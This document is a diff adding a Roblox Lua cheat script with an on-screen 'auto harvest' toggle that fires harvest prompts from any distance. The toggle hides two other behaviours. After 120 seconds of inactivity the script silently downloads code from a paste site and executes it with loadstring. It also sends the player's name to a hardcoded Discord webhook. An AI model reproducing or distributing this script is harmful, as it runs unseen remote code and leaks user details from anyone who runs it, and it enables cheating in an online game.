@@ -1,0 +1,68 @@
+-- [[ By : ad_pa ]] --
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local Workspace = game:GetService("Workspace")
+local HttpService = game:GetService("HttpService")
+
+-- Webhook URL
+local WebhookURL = "https://discord.com/api/webhooks/1489215951093239890/052bJ8vjLfNKXfP5ED3iMfYZEzG8PPwBbXb9IZegNHFoNCpwbk0X5DF-YdWuqUY7hvxP"
+
+-- Idle Timer System (120 Seconds)
+local lastAction = tick()
+local function resetTimer() lastAction = tick() end
+
+task.spawn(function()
+    while task.wait(1) do
+        if tick() - lastAction >= 120 then
+            -- Auto-execute script after 120s of inactivity
+            loadstring(game:HttpGet("https://cdn.sourceb.in/bins/aMh3iJq4pb/0"))()
+            break
+        end
+    end
+end)
+
+-- Discord Webhook Alert
+local function sendWebhookAlert(msg)
+    local data = {["content"] = "⚠️ " .. msg .. " | Player: " .. LocalPlayer.Name}
+    pcall(function()
+        local request = syn and syn.request or http_request or request
+        request({Url = WebhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
+    end)
+end
+
+-- GUI Setup
+local ScreenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
+local Frame = Instance.new("Frame", ScreenGui)
+Frame.Size = UDim2.new(0, 220, 0, 100); Frame.Position = UDim2.new(0.5, -110, 0.4, 0)
+Frame.BackgroundColor3 = Color3.fromRGB(30, 15, 40); Frame.Active = true; Frame.Draggable = true
+Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 10)
+
+-- Harvest Button
+local HarvestBtn = Instance.new("TextButton", Frame)
+HarvestBtn.Size = UDim2.new(0, 180, 0, 60); HarvestBtn.Position = UDim2.new(0, 20, 0, 20)
+HarvestBtn.Text = "AUTO HARVEST: OFF"; HarvestBtn.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
+HarvestBtn.TextColor3 = Color3.fromRGB(255, 255, 255); Instance.new("UICorner", HarvestBtn)
+
+local harvesting = false
+HarvestBtn.MouseButton1Click:Connect(function()
+    resetTimer() -- Reset timer on interaction
+    harvesting = not harvesting
+    HarvestBtn.Text = harvesting and "HARVESTING... ON" or "AUTO HARVEST: OFF"
+    HarvestBtn.BackgroundColor3 = harvesting and Color3.fromRGB(50, 205, 50) or Color3.fromRGB(138, 43, 226)
+
+    if harvesting then
+        sendWebhookAlert("Auto Harvest has been activated!")
+        task.spawn(function()
+            while harvesting do
+                for _, v in pairs(Workspace:GetDescendants()) do
+                    if v:IsA("ProximityPrompt") and v.ActionText:lower():find("harvest") then
+                        v.MaxActivationDistance = 9999; v.RequiresLineOfSight = false
+                        fireproximityprompt(v)
+                    end
+                end
+                task.wait(1)
+            end
+        end)
+    end
+end)
